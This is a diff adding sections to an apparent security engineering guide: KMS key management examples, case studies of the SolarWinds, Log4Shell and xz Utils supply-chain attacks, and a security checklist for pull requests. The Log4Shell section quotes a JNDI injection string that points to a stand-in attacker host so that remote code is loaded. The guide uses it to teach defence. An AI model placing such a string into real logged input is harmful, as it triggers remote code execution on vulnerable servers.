@@ -883,6 +883,93 @@ The KEK never leaves the KMS. The KMS logs every use of it. If you need to "rota
 
 AWS KMS makes this pattern straightforward. The `GenerateDataKey` API call returns both a plaintext DEK and an encrypted DEK in one call. You use the plaintext DEK to encrypt your data, store the encrypted DEK, and throw away the plaintext DEK. When you need to decrypt, call `Decrypt` with the encrypted DEK to get it back.
 
+### Key Management in Practice: Where Keys Live and How They Die
+
+Envelope encryption answers "how do I encrypt this data?" Key management answers "where do the keys live, who can use them, how do I know if they're compromised, and what happens when I rotate them?" These are harder questions.
+
+**Key hierarchy.** In production, you almost never have a single key — you have a hierarchy:
+
+```
+Root Key (Hardware Security Module — never exportable)
+  └── Key Encryption Keys (KMS-managed, one per data class or environment)
+        └── Data Encryption Keys (generated per-record or per-data-class, stored encrypted)
+              └── Your data (encrypted with the DEK)
+```
+
+The root key lives in hardware (an HSM — Hardware Security Module). The HSM is a tamper-resistant device that will destroy the key material if physically opened. AWS KMS's root keys live in HSMs. You never see them. AWS engineers cannot export them. The only operations you can do with them are encrypt/decrypt via the API, and every operation is logged.
+
+**Key rotation.** Rotation means replacing an old key with a new one. The cadence depends on your threat model:
+- Symmetric encryption keys (DEKs): rotate per-record or annually
+- Signing keys for JWTs: rotate every 90 days (or when engineers leave who had access)
+- TLS certificates: 90 days (Let's Encrypt enforces this)
+- Customer-facing API keys: on compromise or on request; support rotation without downtime
+
+Rotation is painful if you haven't designed for it. The common mistake: hardcoding a single key ID rather than storing the key ID alongside the ciphertext. When you rotate, old records were encrypted with the old key. If every piece of ciphertext knows its key ID, decryption always uses the right key. Re-encryption can happen lazily (decrypt with old key, re-encrypt with new key on next read) rather than requiring a big-bang migration.
+
+AWS KMS makes this concrete:
+
+```python
+import boto3
+
+kms = boto3.client('kms')
+
+# Encrypt — returns ciphertext blob (includes key metadata)
+response = kms.encrypt(
+    KeyId='arn:aws:kms:us-east-1:123456789012:key/mrk-...',
+    Plaintext=b'sensitive data here'
+)
+ciphertext_blob = response['CiphertextBlob']  # Store this
+
+# Decrypt — KMS extracts the key ID from the ciphertext blob automatically
+response = kms.decrypt(CiphertextBlob=ciphertext_blob)
+plaintext = response['Plaintext']
+```
+
+The `CiphertextBlob` returned by KMS contains metadata identifying which key was used. When you call `Decrypt`, KMS reads that metadata and uses the correct key. If you've rotated the key, KMS keeps old versions for decryption while using the new version for new encryptions. You don't have to track key versions yourself for KMS-managed keys.
+
+**Key access control.** The question "who can decrypt this data?" is answered entirely by "who has permission to call the KMS Decrypt API with this key." This makes authorization for encrypted data a KMS policy question, not an application policy question.
+
+```json
+{
+  "Effect": "Allow",
+  "Principal": {
+    "AWS": "arn:aws:iam::123456789012:role/prod-api-service"
+  },
+  "Action": ["kms:Decrypt", "kms:GenerateDataKey"],
+  "Resource": "*",
+  "Condition": {
+    "StringEquals": {
+      "kms:EncryptionContext:service": "payments",
+      "kms:EncryptionContext:environment": "production"
+    }
+  }
+}
+```
+
+This key policy allows `prod-api-service` to decrypt, but only when the encryption context includes `service=payments` AND `environment=production`. A compromised dev service can't use this key to decrypt production payment data, even if it somehow gets access to the encrypted blobs. The encryption context is authenticated additional data that's checked on every KMS operation.
+
+**Key compromise.** When you suspect a key is compromised, the response is:
+1. Disable the key in KMS immediately — no new operations can use it
+2. Rotate: generate a new key, decrypt old records with the old key (still possible after disabling, just prevents new use), re-encrypt with the new key
+3. Audit all KMS CloudTrail logs for operations using the compromised key — when did it start, what was accessed, by whom?
+4. Assess blast radius: what data was encrypted with this key?
+
+The audit trail is critical. AWS CloudTrail logs every KMS API call — KeyId, caller identity, IP address, timestamp. This is your forensic record. When you need to know "did an attacker use this key to decrypt customer data?", the CloudTrail logs tell you.
+
+**Secrets rotation without downtime.** The operational challenge: rotating database passwords or API keys without taking your service offline. The pattern:
+
+```
+Old secret: db-password-v1
+New secret: db-password-v2
+
+Step 1: Create new secret (db-password-v2) in the database and Secrets Manager
+Step 2: Deploy new application version that tries v2 first, falls back to v1
+Step 3: Verify all traffic is using v2 (audit logs show v1 has 0 successful connections)
+Step 4: Remove v1 from the database and Secrets Manager
+```
+
+This "dual-version" window — where both old and new secrets are valid — is the key to zero-downtime rotation. Automate it. AWS Secrets Manager has built-in rotation for RDS databases that does this automatically on a schedule.
+
 ### TLS 1.3: The Handshake Gets Faster
 
 TLS is what puts the "S" in HTTPS. It's the protocol that encrypts data in transit. TLS 1.3, released in 2018, is a significant improvement over TLS 1.2.
@@ -1126,6 +1213,165 @@ The engineering controls that SOC2 requires map almost perfectly onto good secur
 - DPAs in place for data processors
 
 The work of being SOC2-compliant is largely the work of being a mature engineering organization. The audit process forces you to document controls you probably already have but haven't formalized. That documentation is valuable independently of the compliance outcome.
+
+---
+
+## 7. Supply Chain Security: When the Attack Comes from Inside the Build
+
+The three supply chain incidents every engineer should know — not as horror stories, but as case studies in how the "trusted" parts of your stack became attack vectors.
+
+### SolarWinds (2020): The Poisoned Update
+
+The SolarWinds Orion platform is network monitoring software used by 33,000 organizations including U.S. federal agencies. In late 2020, researchers discovered that a malicious DLL — named `SolarWinds.Orion.Core.BusinessLayer.dll` — had been embedded in the legitimate, digitally signed Orion software updates since March 2020.
+
+How it worked:
+1. Attackers (later attributed to Russia's SVR) compromised SolarWinds' software build system — the machine that compiled and packaged the software
+2. They injected their malicious code into the build step, so the compiled output contained the backdoor, but the source code did not
+3. The resulting binary was signed with SolarWinds' legitimate code signing certificate
+4. Organizations installed the update because it was signed by a trusted publisher
+
+The malware lay dormant for up to two weeks, then began making DNS queries to its command-and-control infrastructure — using domain generation algorithms to blend in with normal DNS traffic. It checked whether it was running in a security analysis environment (looking for common AV/EDR tool processes) and aborted if so. It stayed dormant longer if certain conditions weren't met. It was designed to be patient.
+
+18,000 organizations installed the backdoor. The attackers chose which targets to activate it against — primarily U.S. government agencies and cybersecurity firms. The breach wasn't discovered for months.
+
+**What this teaches engineers:**
+
+- The build system is part of your attack surface. Treat CI/CD infrastructure with the same rigor as production
+- Code signing proves authenticity of the signer, not security of the content. Signed malware is still malware
+- Reproduced builds (where the same source code always produces bit-identical output) make this attack detectable — the build output wouldn't match a reproduction from source
+- Monitoring your own software's outbound network behavior post-deployment can catch C2 communication even if the initial compromise was perfect
+- Separate build environments from corporate networks. The team that maintains SolarWinds' build infrastructure had the same network access as everyone else
+
+### Log4Shell (2021): The Library That Was Everywhere
+
+On December 9, 2021, a security researcher published a proof-of-concept exploit for CVE-2021-44228 in Apache Log4j. Within hours, internet-wide scanning began. Within days, ransomware groups and nation-state actors were actively exploiting it.
+
+The vulnerability: Log4j, the most widely used Java logging library, supported a feature called JNDI lookup. If a logged string contained `${jndi:ldap://evil.com/payload}`, Log4j would make an outbound LDAP request to `evil.com` and load a Java class from the response, executing arbitrary code.
+
+Every place your application logged user-controlled input was potentially vulnerable. Headers, form fields, usernames, even User-Agent strings — anywhere that ended up in a log line was an attack surface.
+
+The scale of impact:
+- Log4j was embedded in thousands of commercial and open-source products — including products that vendors didn't even know used it (it was a transitive dependency)
+- Apple, Twitter, Amazon, Microsoft, Cloudflare, Minecraft, and thousands of others were affected
+- The CISA emergency directive required all federal agencies to patch within days
+- "LunaSec" estimated at the time that it affected 3 billion devices running Java
+
+**What this teaches engineers:**
+
+- Know your transitive dependencies. The SBOM (Software Bill of Materials) concept went from niche to urgent overnight. Organizations that had SBOMs could answer "are we affected?" in minutes. Others took weeks
+- The blast radius of a logging library is enormous — everything logs
+- Defense in depth matters even when a zero-day hits. Organizations with outbound network controls (egress firewall blocking unexpected LDAP/RMI traffic) were not exploitable even before patching
+- Patch cadence matters. Organizations running Log4j 2.x were affected; those few still running 1.x were not (different vulnerability). But Log4j 2.x had added features and performance improvements over 1.x — the new features created the attack surface
+- Subscribe to security advisories for your critical dependencies. Tools like Dependabot can't help you with a zero-day before a patch exists, but they put you in the habit of applying fixes immediately when they do
+
+### xz Utils (2024): The Patient Attacker
+
+In March 2024, a Microsoft engineer named Andres Freund noticed that SSH logins on his Debian system were slightly slower than expected and consuming more CPU than normal. He investigated. What he found: the xz Utils compression library (a dependency used by systemd, which handles SSH authentication on many Linux distributions) had been backdoored.
+
+This wasn't a typical supply chain attack. The attacker — operating under the pseudonym "Jia Tan" — had spent two years contributing legitimate, high-quality patches to xz Utils. They built trust with the maintainer (who was burned out and grateful for the help). They arranged for "other" accounts (likely their own) to pressure the maintainer to add Jia Tan as a co-maintainer. Then, over months, they introduced the backdoor through a series of changes that each looked innocent in isolation.
+
+The backdoor was injected through the build system's test scripts, not in the main source code — making it harder to spot in code review. The malicious binary was embedded in the release tarball but not in the git repository. Someone doing `git diff` against the source would not see it. The backdoor specifically targeted OpenSSH on glibc-based Linux systems, and only when systemd was used — it was designed to affect servers, not developer workstations.
+
+The attack was caught before it reached stable releases of major distributions, due to Andres Freund's curiosity about SSH performance. It was extremely close.
+
+**What this teaches engineers:**
+
+- Social engineering attacks on open-source maintainers are real and sophisticated. Burnout in open-source maintainership is a security vulnerability
+- The attack surface is not just the code — it's the build scripts, the release process, the tarballs. Verify that release artifacts match what git says
+- Reproducible builds can detect this class of attack — a backdoored tarball will not reproduce from source
+- No amount of code review catches a patient, capable attacker who is also contributing good code for two years
+- Dependency pinning by hash (not just version) means you're running exactly what was reviewed, not whatever was published to a package registry yesterday
+
+### The Engineering Response: Hardening Your Supply Chain
+
+These three stories share a common theme: the attack came through a trusted channel. The defenses:
+
+**Pin dependencies by cryptographic hash.** Don't just pin `log4j@2.14.1` — pin to the specific artifact hash. If the package registry serves a different artifact for that version (compromised registry, typosquatting, dependency confusion), your build fails.
+
+```bash
+# npm — package-lock.json contains SHA-512 hashes per package
+# pip — use pip-compile with --generate-hashes
+# go — go.sum contains hashes for every module version
+pip install --require-hashes -r requirements.txt
+```
+
+**Generate and maintain an SBOM.** Know exactly what's in every build. When the next Log4Shell drops, you run `grep` on your SBOM, not a manual inventory of every service.
+
+```bash
+# Syft generates SBOMs from container images or directories
+syft scan your-service:latest -o spdx-json > sbom.json
+
+# Grype scans an SBOM against vulnerability databases
+grype sbom:sbom.json
+```
+
+**Verify artifact signatures.** Sigstore/Cosign allows packages to be signed with short-lived certificates tied to the build pipeline identity (not long-lived private keys that can be stolen). Verify signatures before using artifacts.
+
+**Separate build environments.** Your CI/CD pipeline should not have access to your production environment. Compromising CI should not allow compromising prod. Use separate IAM roles, secrets, and network access for build vs. deploy steps.
+
+**Monitor outbound connections from your services.** A backdoored library will eventually try to phone home. If your services make unexpected outbound connections to strange IPs or domains, you want to know. Egress firewalls + anomaly detection on DNS queries catch C2 traffic that signature-based tools miss.
+
+**Review the humans behind your critical dependencies.** This doesn't mean distrust all open-source contributors. It means: for your five most critical transitive dependencies, understand who maintains them, whether they're actively maintained, and what your plan is if they're abandoned or compromised.
+
+---
+
+## 8. Security Checklist for Every PR
+
+Security review doesn't have to mean a formal security audit before every merge. It means building security questions into your regular code review practice. This checklist represents the fastest path to catching the most common issues — run through it when you're writing code and when you're reviewing a colleague's PR.
+
+### Authentication & Authorization
+
+- [ ] **Every endpoint that changes state is authenticated.** No unauthenticated `POST`, `PUT`, `PATCH`, `DELETE` endpoints unless the public access is intentional and explicit.
+- [ ] **Every endpoint checks authorization, not just authentication.** Verified the user is who they say they are (authn) AND that they're allowed to perform this action on this specific resource (authz).
+- [ ] **Object-level authorization is checked server-side.** For any endpoint accepting a resource ID, the query is scoped to the current user's owned/accessible resources — not just a lookup by ID.
+- [ ] **Admin endpoints are protected by an admin check, not just authentication.** Tested with a non-admin token to confirm a 403 is returned.
+- [ ] **Privilege-sensitive fields are not user-writable.** `role`, `is_admin`, `account_balance`, `email_verified` are not accepted from user-supplied request bodies.
+
+### Input Validation & Output Encoding
+
+- [ ] **All database queries use parameterized queries or an ORM.** No string concatenation of user input into SQL. No `f"...WHERE id = {user_id}"`.
+- [ ] **All user-supplied file paths are canonicalized and verified against an allowed base directory.** `realpath()` + prefix check before any file operation.
+- [ ] **User-supplied content rendered in HTML is properly escaped.** No raw use of `innerHTML`, `v-html`, `dangerouslySetInnerHTML` with user data. DOMPurify is used if rich HTML is genuinely needed.
+- [ ] **Content-Security-Policy header is set.** Inline scripts restricted or eliminated.
+- [ ] **API responses do not leak sensitive internal data.** Error messages describe the error type (not found, invalid input) without stack traces, database field names, or internal structure.
+
+### Secrets & Credentials
+
+- [ ] **No secrets in the code.** No API keys, passwords, connection strings, or tokens in source files, Dockerfiles, scripts, or test fixtures.
+- [ ] **No secrets in environment variable defaults that would be committed.** `.env.example` contains only placeholder values.
+- [ ] **Secrets are fetched from a secrets manager at runtime, not at build time.** Application reads from Vault/Secrets Manager on startup, not from a baked-in build artifact.
+- [ ] **New infrastructure secrets (DB credentials, API keys) are rotatable.** If a key is leaked, you can rotate it without downtime.
+
+### Cryptography
+
+- [ ] **Passwords are hashed with bcrypt, argon2id, or scrypt.** Not MD5, SHA-1, or SHA-256.
+- [ ] **JWTs are validated with explicit algorithm specification.** Not using the algorithm from the token header. Expiry, issuer, and audience are checked.
+- [ ] **Access tokens have short expiry (15-60 minutes).** Refresh tokens are rotated on use.
+- [ ] **TLS is enforced.** No plaintext HTTP endpoints. HSTS header is set on HTTPS responses.
+
+### Data Handling
+
+- [ ] **Personal data collected is limited to what's actually needed.** No "might be useful later" fields.
+- [ ] **Sensitive data is not logged.** Checked logs for passwords, tokens, SSNs, payment data, or full email addresses (depending on your data classification policy).
+- [ ] **New external API calls are reviewed for what data is sent.** Third-party analytics, error tracking, logging services — ensure you're not sending PII that violates your DPA.
+- [ ] **File uploads are validated for type (magic bytes, not extension) and size.** Uploaded files are not executed. Files are stored outside the web root.
+
+### Infrastructure Changes
+
+- [ ] **New IAM roles/policies follow least privilege.** No `*` resources or actions where specific ones can be named. Reviewed with a fresh eye: "what's the worst case if this role is compromised?"
+- [ ] **New S3 buckets or storage resources have appropriate access controls.** Public access is explicitly considered and documented if enabled.
+- [ ] **New network security group rules don't open unnecessary ports.** Database ports are not open to `0.0.0.0/0`.
+- [ ] **New Docker images run as non-root.** Read-only root filesystem where possible.
+
+### Dependencies
+
+- [ ] **New dependencies are from active, reputable sources.** Checked for known CVEs (`npm audit`, `pip-audit`, `trivy`). Verified the package name is not a typosquat of a well-known package.
+- [ ] **Lockfile is updated and committed.** `package-lock.json`, `Pipfile.lock`, `go.sum` — pinned to specific versions with hashes.
+- [ ] **Deserialization of untrusted data uses safe formats only.** JSON with schema validation, not binary serialization formats applied to user input.
+
+**How to use this checklist:** You don't need to work through every item for every PR. Calibrate to the PR. A PR that only changes copy doesn't need a cryptography review. A PR that adds a new API endpoint needs the auth, input validation, and data handling sections. A PR that changes dependency versions needs the dependency section. A PR that adds a file upload feature needs everything.
+
+The goal is to make security review a natural part of the code review conversation, not a separate gating process. When a PR author can check these boxes themselves before requesting review, the review is faster and the issues caught are the subtle ones — not the basics.
 
 ---
 
